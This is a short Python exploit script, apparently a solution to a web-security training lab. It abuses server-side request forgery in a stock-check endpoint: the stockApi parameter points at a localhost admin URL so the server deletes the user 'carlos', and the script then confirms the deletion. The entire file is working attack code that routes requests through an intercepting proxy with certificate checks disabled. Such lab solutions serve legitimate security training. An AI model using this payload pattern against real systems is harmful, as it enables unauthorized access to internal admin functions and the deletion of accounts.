import requests
import sys
import urllib3
from urllib3.exceptions import InsecureRequestWarning

# Disable insecure request warnings
urllib3.disable_warnings(InsecureRequestWarning)

# Define proxy settings
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def delete_user(url):
    delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}

    # Attempt to delete the user
    response = requests.post(
        f"{url}{check_stock_path}", data=params, verify=False, proxies=proxies)

    # Check if user was deleted
    admin_ssrf_payload = 'http://localhost/admin'
    params2 = {'stockApi': admin_ssrf_payload}
    response = requests.post(
        f"{url}{check_stock_path}", data=params2, verify=False, proxies=proxies)

    if 'User deleted successfully' in response.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful.")


def main():
    if len(sys.argv) != 2:
        script_name = sys.argv[0]
        print(f"(+) Usage: {script_name} <url>")
        print(f"(+) Example: {script_name} www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)


if __name__ == "__main__":
    main()
